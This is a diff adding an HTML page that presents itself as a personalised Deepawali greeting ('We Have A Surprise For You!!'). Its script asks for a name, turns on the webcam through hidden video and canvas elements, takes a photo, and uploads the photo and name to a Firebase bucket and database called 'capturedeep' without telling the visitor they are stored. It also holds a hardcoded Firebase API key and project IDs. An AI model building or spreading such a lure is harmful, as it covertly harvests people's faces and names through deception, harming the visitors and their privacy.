@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WishDeep</title>
+    <style>
+        /* Main styling */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: url('download.jpeg') no-repeat center center fixed;
+            background-size: cover;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            text-align: center;
+        }
+        .container {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 40px 20px;
+            border-radius: 10px;
+            width: 300px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 16px;
+            width: 100%;
+        }
+        button {
+            background: #FF5722;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            height: 50px;
+            font-size: 20px;
+            cursor: pointer;
+            outline: none;
+            transition: transform 0.3s ease;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        video, canvas {
+            display: none;
+        }
+        /* Loader styling */
+        .loader {
+            display: none;
+            border: 5px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 5px solid #FF5722;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Popup styles */
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup-content {
+            background-image: url('download.jpeg');
+            background-size: cover;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            color: #fff;
+            text-align: left;
+            position: relative;
+        }
+        .popup-content img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            position: absolute;
+            top: -50px;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 3px solid #fff;
+        }
+        .popup-content h2, .popup-content p {
+            margin-top: 40px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        /* Footer styling */
+footer {
+    position: fixed;
+    bottom: 10px;
+    width: 100%;
+    text-align: center;
+    font-size: 14px;
+    color: #ffffff;
+    font-family: Arial, sans-serif;
+    opacity: 0.9;
+    background: rgba(0, 0, 0, 0.5);
+    padding: 10px;
+    border-radius: 5px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+footer .profile-pic {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    border: 2px solid #ffffff;
+}
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>We Have A Surprise For You!!</h1>
+        <p>Please enter your name:</p>
+        <input type="text" id="userName" placeholder="Your Name" required>
+        <button id="submitCaptureBtn">Submit</button>
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <video id="camera" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- Popup for Wishes -->
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <img id="userImage" src="" alt="User Image">
+            <h2>Dear <span id="userWishName"></span>,</h2>
+            <p id="wishText">Wishing you a very Happy Deepawali filled with joy, prosperity, and peace. May this festival of lights bring happiness to you and your family, and may your home be blessed with warmth and love. May this Deepawali bring light and joy to all aspects of your life.</p>
+            <p>Your Friend,<br>Neha <br> (Chiku)</p>
+        </div>
+    </div>
+<!-- Footer -->
+<footer>
+<a href="www.techsolvy.online">
+<img src="ceo.jpeg" alt="Pt. Avinash Mishra Shastri" class="profile-pic"> </a>
+    Design & Built By Pt. Avinash Mishra Shastri,Founder Of TechSolvy 
+www.techsolvy.online
+</footer>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-app.js";
+        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-storage.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-firestore.js";
+
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyAwB8JWKIRK6Bkat-NdM6OyVAvdrBk5cmM",
+  authDomain: "capturedeep-126bf.firebaseapp.com",
+  projectId: "capturedeep-126bf",
+  storageBucket: "capturedeep-126bf.appspot.com",
+  messagingSenderId: "527347157327",
+  appId: "1:527347157327:web:d7db7bb6d0fe021547dd3a",
+  measurementId: "G-VZEFR8X5BN"
+};
+
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+        const db = getFirestore(app);
+
+        const userNameInput = document.getElementById('userName');
+        const submitCaptureBtn = document.getElementById('submitCaptureBtn');
+        const camera = document.getElementById('camera');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const loader = document.getElementById('loader');
+        const popup = document.getElementById('popup');
+        const userWishName = document.getElementById('userWishName');
+        const wishText = document.getElementById('wishText');
+        const userImage = document.getElementById('userImage');
+
+        let stream;
+
+        async function openCamera() {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            camera.srcObject = stream;
+        }
+
+        submitCaptureBtn.addEventListener('click', async () => {
+            const userName = userNameInput.value.trim();
+            if (!userName) {
+                alert('Please enter your name.');
+                return;
+            }
+
+            loader.style.display = 'block'; // Show loader
+
+            await openCamera();
+
+            setTimeout(() => {
+                canvas.width = camera.videoWidth;
+                canvas.height = camera.videoHeight;
+                context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob(async (blob) => {
+                    const imageRef = ref(storage, `deepawali_pics/${Date.now()}.png`);
+                    await uploadBytes(imageRef, blob);
+
+                    const imageUrl = await getDownloadURL(imageRef);
+                    await addDoc(collection(db, 'users'), {
+                        name: userName,
+                        imageUrl: imageUrl
+                    });
+
+                    // Display wishes in popup
+                    loader.style.display = 'none'; // Hide loader
+                    userWishName.innerText = userName;
+                    userImage.src = imageUrl;
+                    popup.style.display = 'flex';
+                });
+            }, 500);
+        });
+    </script>
+
+</body>
+</html>
